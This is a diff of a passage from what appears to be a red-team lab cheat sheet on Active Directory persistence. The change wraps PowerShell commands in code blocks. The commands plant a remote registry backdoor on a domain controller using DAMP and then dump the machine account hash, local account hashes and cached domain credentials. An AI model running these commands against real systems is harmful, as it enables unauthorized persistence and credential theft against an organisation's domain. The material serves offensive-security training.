@@ -667,16 +667,30 @@ Set-RemotePSRemoting -SamAccountName student1 -ComputerName dcorp-dc -Remove
 # **Using ACLs - Security Descriptors - Remote Registry**
 
 
-Using RACE or DAMP, with admin privs on remote machine
+- Using `RACE` or DAMP, with admin privs on remote machine (Make sure to run this first) -:
 
-Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee
-student1 -Verbose
+```powershell
+Add-RemoteRegBackdoor -ComputerName dcorp-dc -Trustee student1 -Verbose
+```
 
 - As student1, retrieve machine account hash:
+
+```powershell
 Get-RemoteMachineAccountHash -ComputerName dcorp-dc -Verbose
+```
 
 - Retrieve local account hash:
+
+```powershell
 Get-RemoteLocalAccountHash -ComputerName dcorp-dc -Verbose
+```
 
 - Retrieve domain cached credentials:
+
+```powershell
 Get-RemoteCachedCredential -ComputerName dcorp-dc -Verbose
+```
+
+
+
+
